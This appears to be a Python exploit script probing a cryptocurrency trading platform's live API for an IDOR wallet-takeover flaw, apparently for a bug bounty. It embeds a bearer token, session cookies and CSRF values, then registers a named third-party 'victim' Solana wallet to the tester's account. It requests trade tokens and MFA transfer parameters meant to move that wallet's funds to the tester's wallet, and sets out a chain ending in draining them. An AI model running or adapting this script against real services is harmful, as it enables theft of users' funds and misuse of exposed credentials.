#!/usr/bin/env python3
"""
WALLET TAKEOVER TEST
If register_wallet binds a wallet to our account, can we then:
1. Access it via user_info (should show up in our wallet list)
2. Get trade_token for it
3. Generate MFA params for it (since it's "ours" now)
4. Actually control it?
"""
import json
import requests

ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzE0LTIxMTktYzkxMzE0MSIsImRldmljZV9pZCI6ImRlNjIwYTU3LWQ5OGUtNDI5My1iMDA3LTVkMzE1NDU1ZTIxZCIsImZhdGhlcl9pZCI6Ijk5NDcwOTk3LWZkMTAtNGJhNi1hMmEwLTMxMTg1MDUzYTEzNiIsImZpbmdlcnByaW50IjoidjE1MzI0N2I5ZTBlMTg0ZmJlZDNmYWM3M2YxOWRjYTY4YSIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODQxNTAwNzEsImlhdCI6MTc4NDE0ODI3MSwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiJkMDk5YjBkOC00YjU4LTQ3NTAtODE3Ny1jZGQxNzc4M2IzYWIiLCJuYmYiOjE3ODQxNDgyNzEsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsInZlciI6IjEuMCJ9.TV7wZzxo4VdM8D8CGOYBHVM1Z_p5neU0uXR9s7O7bg4s6Z3LGrweF2DTcPp9pWLlDP-czAg6c7E16VVsqfmBtw"

COOKIES = {
    '_ga_UGLVBMV4Z0': 'GS1.2.1784147274019075.6b09445dc224ac4ed190f0fc17562c09.%2BWBECXoGBNBcg0Fo8XQ6Zw%3D%3D.MgwbCP7e6%2F%2Fgxg46Zi4hxw%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.lf0gy6vV0UZfM%2Buod%2FYChA%3D%3D',
    '__cf_bm': 'BiwqYrKdqGkcrH0ZLK9f_OKFba2OCsbJ28phLs8iDi0-1784147278.2017257-1.0.1.1-nFEvU2MgsYGgu6HECjXk37MIl.qPDHnGC9TNy4X5mLQ_hqdjAngW69Qng5QVjwhaQkvk8bzJQDDqab54zo2xpYk0LzVwc4rsuc8AaEkVbHhs1LgUDKxdYJRDqJicqnnR',
    'g_state': '{"i_l":1,"i_ll":1784064572835,"i_e":{"enable_itp_optimization":24},"i_et":1784064572835,"i_b":"ZKMAELdKKMvOaL6Er88DW7w1hSd2zpaA4oygW8X+Lo4"}',
    '_ga_0XM0LYXGC8': 'GS2.1.s1784146779$o42$g1$t1784147281$j50$l0$h0',
    '_ga': 'GA1.1.1499118900.1783283677',
    '_csrf': 'L6Giyxap0kezMoy_ZZVuEuos0BMQCWu2',
    '_did': 'c800ab0b7d01aa37bc93aacdcbce271e',
    '_wt': 'AWpf5OQ6yKhuZEDm40uECgKO0pTyVxTLhc8Ds-Q',
    'sid': 'gmgn%7Ca04bda1a723a8218b4953962ef8e9169'
}

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
}

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"

print("="*80)
print("🔥 WALLET TAKEOVER TEST")
print("="*80)
print(f"Theory: If register_wallet binds victim wallet to our account,")
print(f"we might be able to access/control it as if it's ours.")
print("="*80)

# STEP 1: Register victim wallet to our account (already done, but let's confirm)
print("\n[STEP 1] Register victim wallet under our account")
print(f"Victim wallet: {VICTIM_SOL}")
print(f"Our user_id: {OUR_USER_ID}")

r = requests.post(
    "https://gmgn.ai/defi/quotation/v1/register_wallet",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "chain": "sol",
        "address": VICTIM_SOL,
        "user_id": OUR_USER_ID
    },
    timeout=10
)

print(f"\nStatus: {r.status_code}")
if r.status_code == 200:
    data = r.json()
    print(f"Response: {json.dumps(data, indent=2)}")
    
    if data.get('code') == 0:
        print(f"✅ Wallet registered successfully!")
    else:
        print(f"⚠️  Registration failed: {data.get('msg')}")
else:
    print(f"Error: {r.text[:200]}")

# STEP 2: Check if victim wallet now shows up in OUR wallet list
print("\n" + "="*80)
print("[STEP 2] Check if victim wallet appears in our wallet list")
print("="*80)

r = requests.post(
    "https://gmgn.ai/account/wallet/list",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={},
    timeout=10
)

print(f"Status: {r.status_code}")
if r.status_code == 200:
    data = r.json()
    print(f"Response: {json.dumps(data, indent=2)[:1000]}")
    
    if data.get('code') == 0:
        wallet_list = data.get('data', {}).get('wallet_list', [])
        print(f"\n📋 Our wallet list ({len(wallet_list)} wallets):")
        
        victim_found = False
        for w in wallet_list:
            addr = w.get('address', '').lower()
            if addr == VICTIM_SOL.lower():
                print(f"\n💀💀💀 VICTIM WALLET FOUND IN OUR LIST!")
                print(f"Wallet: {w}")
                victim_found = True
            else:
                print(f"  • {w.get('address')} ({w.get('chain')})")
        
        if not victim_found:
            print(f"\n⚠️  Victim wallet NOT in our list")
            print(f"   register_wallet might only affect referrals, not ownership")
elif r.status_code == 404:
    print(f"⚠️  Endpoint not found - trying alternative")
else:
    print(f"Error: {r.text[:200]}")

# STEP 3: Try to get trade_token for victim wallet
print("\n" + "="*80)
print("[STEP 3] Try to get trade_token for victim wallet")
print("="*80)
print("If wallet is bound to us, we should be able to get trade_token")

r = requests.post(
    "https://gmgn.ai/account/trade_token",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "wallet_address": VICTIM_SOL,
        "secret": "test123"
    },
    timeout=10
)

print(f"Status: {r.status_code}")
if r.status_code == 200:
    data = r.json()
    print(f"Response: {json.dumps(data, indent=2)[:500]}")
    
    if data.get('code') == 0:
        print(f"\n💀💀💀 GOT TRADE_TOKEN FOR VICTIM WALLET!")
        print(f"This means we have MPC signing authority!")
        if data.get('data', {}).get('trade_token'):
            print(f"Trade Token: {data['data']['trade_token'][:50]}...")
    else:
        print(f"Error: {data.get('message')}")
else:
    print(f"Error: {r.text[:200]}")

# STEP 4: Try to generate MFA params for victim wallet (NOW THAT IT'S "OURS")
print("\n" + "="*80)
print("[STEP 4] Try MFA params for victim wallet (post-registration)")
print("="*80)
print("If wallet is truly bound to us, MFA should work now")

r = requests.post(
    "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "usage": "transfer",
        "biz_params": {
            "transfer_id": "999",
            "transfer_type": "999",
            "chain": "sol",
            "from_address": VICTIM_SOL,  # Victim wallet
            "to_address": "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8",  # Our wallet
            "amount": "1000",
            "amount_txt": "0.000001",
            "token_address": "So11111111111111111111111111111111111111112",
            "symbol": "SOL"
        }
    },
    timeout=10
)

print(f"Status: {r.status_code}")
if r.status_code == 200:
    data = r.json()
    print(f"Response: {json.dumps(data, indent=2)}")
    
    if data.get('code') == 0:
        txn_id = data.get('data', {}).get('txn_id')
        verify_items = data.get('data', {}).get('verify_items', [])
        
        print(f"\n💀💀💀💀💀 CRITICAL IDOR CONFIRMED!")
        print(f"Post-registration, we got txn_id for victim wallet!")
        print(f"txn_id: {txn_id}")
        print(f"verify_items: {verify_items}")
        print(f"\nThis is the $50k+ finding!")
        print(f"Attack chain:")
        print(f"1. register_wallet(victim) → binds to our account")
        print(f"2. generate_mfa_params(victim) → returns txn_id")
        print(f"3. transfer(txn_id) → DRAIN VICTIM FUNDS")
    else:
        error_msg = data.get('message', '')
        print(f"Error: {error_msg}")
        
        if 'not self' in error_msg.lower():
            print(f"\n❌ Registration didn't grant ownership")
            print(f"   register_wallet only affects referrals, not wallet control")
else:
    print(f"HTTP Error: {r.text[:200]}")

# STEP 5: Check cashback ownership after registration
print("\n" + "="*80)
print("[STEP 5] Verify cashback ownership")
print("="*80)

r = requests.get(
    "https://gmgn.ai/rebate/api/v1/cashback/pending",
    headers=HEADERS,
    cookies=COOKIES,
    params={**PARAMS, "address": VICTIM_SOL, "chain": "sol"},
    timeout=10
)

print(f"Status: {r.status_code}")
if r.status_code == 200:
    data = r.json()
    print(f"Response: {json.dumps(data, indent=2)}")
    
    if data.get('code') == 0:
        user_id = data.get('data', {}).get('user_id')
        print(f"\nVictim wallet returns user_id: {user_id}")
        
        if user_id == OUR_USER_ID:
            print(f"✅ Victim wallet IS linked to our account!")
            print(f"   Cashback system confirms ownership")
        else:
            print(f"⚠️  Victim wallet returns different user_id")

print("\n" + "="*80)
print("CONCLUSION")
print("="*80)
print("If MFA params succeeded after registration:")
print("  → CRITICAL: Full wallet takeover via register_wallet")
print("  → $75,000+ payout")
print("\nIf MFA params still failed:")
print("  → register_wallet only affects referrals/cashback")
print("  → Still HIGH severity, $35-50k")
